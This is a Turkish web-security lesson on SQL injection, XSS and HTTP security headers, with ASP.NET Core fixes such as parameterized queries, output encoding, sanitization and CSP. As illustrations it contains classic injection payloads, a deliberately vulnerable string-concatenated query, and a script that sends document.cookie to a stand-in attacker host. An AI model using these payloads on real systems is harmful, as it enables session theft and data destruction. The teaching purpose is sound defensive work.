# Gün 108 — API Security 3: SQL Injection, XSS ve Güvenlik Header'ları

---

## Bu Ders Neden Var?

Bugün **enjeksiyon (injection)** saldırılarını ele alacağız. Mantık aynı: saldırgan girdi alanına kötü niyetli kod yazıyor, server veya tarayıcı bunu kod olarak çalıştırıyor.

İki büyük tip var:

- **SQL Injection:** Saldırgan veritabanına çalışacak kod sokuyor
- **XSS (Cross-Site Scripting):** Saldırgan tarayıcıda çalışacak JavaScript sokuyor

İkisinin de çaresi aynı prensiple başlıyor: **veriyi koddan ayır.** Kullanıcı girdisi asla kod olarak yorumlanmamalı.

---

## SQL Injection — Klasik Ama Hâlâ Yaygın

### Saldırı Nasıl Çalışıyor?

Bir login formu düşün. Geliştirici şöyle kod yazdı:

```csharp
// ❌ TEHLİKELİ — string concatenation ile SQL:
var sql = $"SELECT * FROM Users WHERE Email='{email}' AND Password='{password}'";
var user = await _connection.QueryAsync(sql);
```

Normal kullanıcı:
- email: `berkan@mail.com`
- password: `123456`

Üretilen SQL:
```sql
SELECT * FROM Users WHERE Email='berkan@mail.com' AND Password='123456'
```

Sorun yok gibi. Ama saldırgan ne yazıyor:
- email: `' OR '1'='1`
- password: `herhangi-bir-şey`

Üretilen SQL:
```sql
SELECT * FROM Users WHERE Email='' OR '1'='1' AND Password='herhangi-bir-şey'
```

`'1'='1'` her zaman true. Sorgu tüm kullanıcıları döndürüyor. Genelde ilk satır admin → saldırgan admin olarak giriş yaptı.

### Daha Korkutucu Örnek

Saldırgan email alanına `'; DROP TABLE Users; --` yazsaydı:

```sql
SELECT * FROM Users WHERE Email=''; DROP TABLE Users; --' AND Password='...'
```

`;` ile SQL ifadesini bitirip ikinci komutu çalıştırıyor: `DROP TABLE Users`. `--` ile gerisini comment yapıyor. Tablo silindi.

(Gerçekte çoğu DB driver birden fazla statement çalıştırmaya izin vermez ama bu saldırıların prensibi bu.)

### Çözüm: Parameterized Query

Kullanıcı girdisini **SQL kodunun parçası** olarak değil, **veri** olarak ele al:

```csharp
// ✓ Parameterized query:
var sql = "SELECT * FROM Users WHERE Email=@Email AND Password=@Password";
var user = await _connection.QueryAsync(sql, new { Email = email, Password = password });
```

`@Email` ve `@Password` placeholder. DB driver bunları:
1. SQL'i önce derler (placeholder'ları görür)
2. Sonra parametre değerlerini ayrı gönderir
3. Değerleri **sadece veri olarak** kullanır, SQL kodu olarak yorumlamaz

Yani saldırgan `' OR '1'='1` yazsa bile, bu string SQL kontrolüne dönüşmez — `Email` alanında aranan değer olur. "Email'i `' OR '1'='1` olan kullanıcı var mı?" → yok → giriş başarısız.

**Anahtar fark:** String concatenation ile veri ve kod karışıyor. Parameterized query ile ayrı kanallardan gidiyor.

### EF Core Otomatik Korur

EF Core LINQ sorguları varsayılan olarak parameterized query üretir:

```csharp
// EF Core otomatik parameterize eder:
var user = await _context.Users
    .Where(u => u.Email == email && u.Password == passwordHash)
    .FirstOrDefaultAsync();

// Üretilen SQL:
// SELECT * FROM Users WHERE Email = @__email_0 AND Password = @__passwordHash_1
```

Sen string birleştirme yapmadığın sürece güvendesin. **Tehlike:** raw SQL veya `FromSqlRaw` kullanırken string interpolation yapma:

```csharp
// ❌ Tehlikeli — string concat:
var users = _context.Users.FromSqlRaw($"SELECT * FROM Users WHERE Email='{email}'");

// ✓ Güvenli — parameter ile:
var users = _context.Users.FromSqlRaw("SELECT * FROM Users WHERE Email={0}", email);

// ✓ En güvenli — FromSqlInterpolated (otomatik parameterize):
var users = _context.Users.FromSqlInterpolated($"SELECT * FROM Users WHERE Email={email}");
// $ ile interpolasyon görüntüsünde ama arka planda parameter kullanıyor
```

### "Validation Yaparım, SQL Injection'a Karşı Korunurum" — Yanılgı

Bazen geliştiriciler diyor ki: "ben email validation yapıyorum, kötü karakterleri filtreliyorum, SQL Injection olamaz."

**Sorun bu yaklaşımla:**
- Hangi karakterleri yasaklayacaksın? Liste çok uzun, eksik bırakırsın
- Bazı normal isimler bu karakterleri içerir: "O'Connor"
- Unicode varyasyonları, encoding bypass'leri var

**Doğru yaklaşım:** Validation YAP (genel veri kalitesi için), ama SQL Injection'a karşı tek savunma asla validation olmasın. Parameterized query temel savunma.

---

## XSS (Cross-Site Scripting) — Tarayıcıda Kod Çalıştırma

### Saldırı Nasıl Çalışıyor?

Bir forum sitesi düşün. Kullanıcı yorum yazıyor, server kaydediyor, başka kullanıcılar görüyor:

```html
<!-- Server şöyle render ediyor: -->
<div class="yorum">
    {kullanici_yorumu}
</div>
```

Normal kullanıcı: "Harika makale!" → görüntüleniyor, sorun yok.

Saldırgan ne yazıyor:
```html
<script>
    fetch('https://saldirgan-sunucusu.com/cal?cookie=' + document.cookie);
</script>
```

Bu yorum DB'ye yazıldı. Başka bir kullanıcı sayfayı açtığında server bu yorumu HTML'e gömüyor:

```html
<div class="yorum">
    <script>
        fetch('https://saldirgan-sunucusu.com/cal?cookie=' + document.cookie);
    </script>
</div>
```

Tarayıcı bunu görüyor, `<script>` etiketini çalıştırıyor. Kullanıcının cookie'leri saldırgana gidiyor — oturum çalındı.

### Üç XSS Türü

**1. Stored XSS (Persistent):**
Kötü kod DB'ye kaydediliyor (yukarıdaki yorum örneği). Sayfayı açan herkes etkileniyor. En tehlikeli tür.

**2. Reflected XSS:**
Kötü kod URL'de geçici olarak. Mesela arama sayfası `/search?q=<script>...</script>`. Arama sonucu sayfasında "X için sonuçlar: `<script>...</script>`" → çalışıyor.
- Saldırgan kötü URL'yi mağdura gönderir (mail, mesaj)
- Mağdur tıklar → kendi tarayıcısında kötü kod çalışır

**3. DOM-based XSS:**
Server'a hiç gitmiyor. Tamamen client-side JavaScript güvensiz şekilde URL parametrelerini DOM'a yazıyor.
```javascript
// ❌ Tehlikeli:
document.getElementById("result").innerHTML = location.hash;
// URL: site.com#<img src=x onerror="kötü kod">
```

### Çözüm: Escape (Encode) Etmek

Server kullanıcı verisini HTML'e gömerken **özel karakterleri encode etmeli**:

| Karakter | HTML Encode |
|----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |
| `&` | `&amp;` |

Saldırgan yorumunu encode ettiğinde:
```html
<div class="yorum">
    &lt;script&gt;fetch(...)&lt;/script&gt;
</div>
```

Tarayıcı bunu görür: "script kelimesi yazılmış, etiket değil" → metin olarak gösterir, çalıştırmaz. Saldırı etkisiz.

### ASP.NET Core Otomatik Encode Eder

Razor (`@`) syntax'ı default olarak encode eder:

```razor
<!-- Razor şablonu: -->
<div>@Model.YorumIcerigi</div>

<!-- Üretilen HTML (saldırgan verisi için): -->
<div>&lt;script&gt;...&lt;/script&gt;</div>
```

Sen `@` yazdığın sürece güvendesin. **Tehlike:** `@Html.Raw()` kullanırsan encode'u devre dışı bırakıyorsun:

```razor
<!-- ❌ Tehlikeli — encode yok: -->
<div>@Html.Raw(Model.YorumIcerigi)</div>

<!-- HTML editörden zengin içerik gösteriyorsan — ki HTML lazımdır —
     o zaman önce server'da sanitize etmen lazım: -->
@Html.Raw(_sanitizer.Sanitize(Model.YorumIcerigi))
```

### React, Angular, Vue Otomatik Encode Eder

Modern SPA framework'leri `{value}` ile değer gösterdiğinde otomatik encode ediyor. Tehlike:
- React'te `dangerouslySetInnerHTML`
- Angular'da `[innerHTML]`
- Vue'da `v-html`

Bunları kullandığında encode atlanıyor. Sadece güvendiğin (sanitize edilmiş) içerikte kullan.

### Sanitization vs Encoding — Fark

**Encoding:** Tüm özel karakterleri kaçır. Çıktı saf metin. Zengin içerik (formatlı yorum) gösteremezsin.

**Sanitization:** HTML'i parse et, sadece izin verilen etiketleri bırak, kötü olanları çıkar. Mesela `<b>`, `<p>`, `<a>` kabul et, `<script>`, `<iframe>` çıkar.

```csharp
// HtmlSanitizer paketi:
var sanitizer = new HtmlSanitizer();
var temiz = sanitizer.Sanitize(kullaniciHtml);
// <b>kalın</b> kalır, <script>...</script> silinir
```

Ne zaman hangisi:
- Yorum/post gibi düz metin → encoding yeterli
- Rich text editör çıktısı → sanitization gerekli

---

## Güvenlik Header'ları — Tarayıcıya Talimat

Server, response'a özel header'lar ekleyerek tarayıcıya "şu kuralları uygula" diyebiliyor. Bu header'lar saldırılara karşı ek savunma katmanı.

### Content-Security-Policy (CSP) — XSS'in En İyi Savunması

CSP, sayfada hangi kaynaklardan kod yüklenebileceğini sınırlandırır. Saldırgan XSS payload'u yerleştirse bile, CSP kötü kodun çalışmasını engelleyebilir.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
```

Bu header diyor ki:
- `default-src 'self'` → genelde sadece bu domain'in kaynakları yüklensin
- `script-src 'self' https://cdn.trusted.com` → JavaScript sadece bu domain'den veya güvenilen CDN'den

Saldırgan inline `<script>` enjekte etse bile → CSP "inline script'lere izin yok" → tarayıcı çalıştırmaz.

**Yaygın direktifler:**

| Direktif | Anlamı |
|----------|--------|
| `default-src` | Tüm kaynak tipleri için varsayılan |
| `script-src` | JavaScript dosyaları |
| `style-src` | CSS dosyaları |
| `img-src` | Görseller |
| `connect-src` | fetch/XHR/WebSocket bağlantıları |
| `frame-src` | iframe içeriği |
| `font-src` | Font dosyaları |

**Yaygın değerler:**

- `'self'` → sadece aynı origin
- `'none'` → hiçbir yerden
- `https://example.com` → belirli origin
- `'unsafe-inline'` → inline script/style izinli (KÖTÜ — XSS'in girebileceği yer)
- `'unsafe-eval'` → eval() izinli (KÖTÜ)

```csharp
// ASP.NET Core'da CSP header eklemek:
app.Use(async (context, next) =>
{
    context.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; " +
        "script-src 'self' https://cdn.jsdelivr.net; " +
        "style-src 'self' 'unsafe-inline'; " +    // inline style izin (genelde gerekiyor)
        "img-src 'self' data: https:; " +          // base64 ve HTTPS görsel
        "connect-src 'self' https://api.app.com";
    await next();
});
```

**CSP yazmak zor.** Çünkü kullandığın CDN'leri, inline script'leri, hepsini listelemek gerekiyor. Yanlış yazınca uygulaman bozuluyor. İlk başta `Content-Security-Policy-Report-Only` header'ı ile başla — ihlalleri loglar ama engellemez. Düzelt, sonra `Content-Security-Policy`'ye geç.

### Strict-Transport-Security (HSTS) — HTTPS Zorlama

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

Bu header'ı görünce tarayıcı diyor ki: "Bu siteye 1 yıl boyunca her zaman HTTPS ile gideceğim. Kullanıcı `http://` yazsa bile otomatik `https://` yapacağım."

**Neden gerekli?** Kullanıcı `app.com` yazıyor (https yok). Tarayıcı önce HTTP'ye bağlanıyor → man-in-the-middle saldırgan trafiği yakalayabilir. HSTS ilk istek hariç sonraki tüm istekleri HTTPS'e zorluyor.

```csharp
// Program.cs:
app.UseHsts();
// ne yapar → HSTS header'ı ekler
// production'da kullan, development'ta sorun yaratabilir
```

### X-Content-Type-Options: nosniff

```
X-Content-Type-Options: nosniff
```

Bazı tarayıcılar Content-Type'ı görmezden gelip dosya içeriğini "sniff" eder — "bu .txt dosyası ama içinde HTML var, HTML olarak render edeyim." Bu MIME sniffing güvenlik açıklarına yol açar.

`nosniff` der ki: "Content-Type ne diyorsa o. Tahmin yapma."

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers["X-Content-Type-Options"] = "nosniff";
    await next();
});
```

### X-Frame-Options: DENY veya SAMEORIGIN

```
X-Frame-Options: DENY
```

Bu header sayfanın iframe içine konmasını engeller. **Clickjacking** saldırısına karşı koruma:

Saldırgan kendi sitesinde gizli bir iframe'le senin sitenin "Hesabı Sil" butonunu konumlandırıyor. Üstüne çekici görünen başka bir tıklama hedefi koyuyor. Kullanıcı "tıkla, ödül kazan!" butonuna tıkladığını sanıyor — aslında senin sitedeki "Hesabı Sil" butonuna tıkladı.

`X-Frame-Options: DENY` → siten hiçbir iframe'e konamaz, clickjacking imkansız.

`X-Frame-Options: SAMEORIGIN` → sadece kendi sitenden iframe'e konabilir (kendi sitenle çalışması gerekiyorsa).

Modern alternatif: `Content-Security-Policy: frame-ancestors 'none'` (CSP içinde tanımlanır).

### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```

Tarayıcı her istekte `Referer` header'ı gönderiyor — "bu isteği şu URL'den geliyorum". Bazen bu URL hassas bilgi içerir (`/admin/users/secret-id`). `Referrer-Policy` bu bilginin ne kadarının paylaşılacağını kontrol eder.

`strict-origin-when-cross-origin` (modern öneri):
- Aynı origin'de tam URL → OK
- Farklı origin'de sadece domain → `https://app.com` gönderilir, path gönderilmez

### Permissions-Policy

Eski adı `Feature-Policy`. Tarayıcı API'larını (kamera, mikrofon, lokasyon) kontrol etmek için:

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

Bu sayfada kamera ve mikrofon kapalı, lokasyon sadece kendi origin'i için açık. XSS olsa bile saldırgan kamera açamaz.

### ASP.NET Core'da Header Middleware

Yukarıdaki header'ları her response'a eklemek için custom middleware:

```csharp
app.Use(async (context, next) =>
{
    var headers = context.Response.Headers;
    headers["Content-Security-Policy"] = "default-src 'self'";
    headers["X-Content-Type-Options"] = "nosniff";
    headers["X-Frame-Options"] = "DENY";
    headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
    headers["Permissions-Policy"] = "camera=(), microphone=()";

    await next();
});

// HSTS ayrı çağrı:
app.UseHsts();
```

NuGet paketleri (`NetEscapades.AspNetCore.SecurityHeaders`) bunu daha temiz hale getirir:

```csharp
builder.Services.AddSecurityHeaderPolicies()
    .SetDefaultPolicy(p => p
        .AddDefaultSecurityHeaders()
        .AddContentSecurityPolicy(csp => csp
            .AddDefaultSrc().Self()
            .AddScriptSrc().Self().From("https://cdn.jsdelivr.net")));

app.UseSecurityHeaders();
```

---

## OWASP Top 10 ile Bağlantı

Bugün ele aldığımız konular, OWASP'ın "Top 10 Güvenlik Açığı" listesinin büyük kısmını kapsıyor:

- **A03: Injection** → SQL Injection
- **A03: Injection** → XSS (Cross-Site Scripting)
- **A05: Security Misconfiguration** → Eksik güvenlik header'ları

Gün 109'da OWASP Top 10'u sistematik gözden geçireceğiz — bugünkü konuları da o liste içine yerleştireceğiz.

---

## Defense in Depth — Katmanlı Güvenlik

Hiçbir koruma tek başına yeterli değil. Katmanlı yaklaşım:

**SQL Injection için:**
1. Parameterized query (zorunlu)
2. Input validation (genel veri kalitesi için)
3. DB user'a minimum yetki ver (uygulama user'ı `DROP TABLE` yapamasın)
4. WAF (Web Application Firewall) — şüpheli pattern'leri yakala

**XSS için:**
1. Output encoding (zorunlu — framework otomatik yapıyor)
2. Input validation (HTML editör için sanitization)
3. CSP header (en güçlü ek katman)
4. HttpOnly cookie (çalınan cookie JavaScript'ten okunamaz)

Birden fazla katman demek: birisi yanılırsa diğeri yakalar.

---

## Faz2 ile Karşılaştırma

Faz2 KitabeviMVC'de:
- EF Core kullanılıyor → SQL Injection otomatik korunuyor ✓
- Razor `@` syntax kullanılıyor → XSS otomatik encode ✓
- Güvenlik header'ları yok — eksik

50K kullanıcıda: bu otomatik korumalar yeterli değil. Manuel SQL yazıldığı yerlerde dikkat, HTML editör için sanitization, CSP politikası, HSTS — hepsi olmalı.

---

## 500 vs 50K Kullanıcı

| Teknik | 500 kullanıcı/ay | 50K kullanıcı/ay |
|--------|-------------------|-------------------|
| Parameterized query / EF Core | Her zaman — temel | Zorunlu |
| Output encoding (Razor `@`) | Otomatik yeterli | Otomatik yeterli + Html.Raw'a dikkat |
| HTML Sanitization | Rich editor varsa | Kullanıcı içeriği varsa zorunlu |
| CSP header | İyi alışkanlık | Zorunlu — XSS'in son hattı |
| HSTS, X-Frame-Options vb. | Her zaman — düşük maliyet | Zorunlu |
| WAF | Gereksiz | Cloudflare/AWS WAF kullanmak değerli |

---

## Kontrol Soruları

1. SQL Injection saldırısı string concatenation ile nasıl gerçekleşiyor? Parameterized query bunu nasıl önlüyor?
2. EF Core LINQ sorgularıyla SQL Injection olabilir mi? Hangi durumlarda risk var?
3. "Input validation yaparım, SQL Injection olmaz" yaklaşımı neden yanılgıdır?
4. Stored, Reflected ve DOM-based XSS arasındaki fark nedir?
5. HTML encoding ile sanitization arasındaki fark nedir? Hangi senaryoda hangisi gerekir?
6. CSP `'unsafe-inline'` neden tehlikelidir? Bunu kullanırsan ne riskini alıyorsun?
7. HSTS olmadan kullanıcı `app.com` yazınca ne risk var?
8. Clickjacking saldırısı nasıl çalışır? X-Frame-Options bunu nasıl önler?
9. Defense in depth ne demek? XSS için kaç katman koruma sayabilirsin?
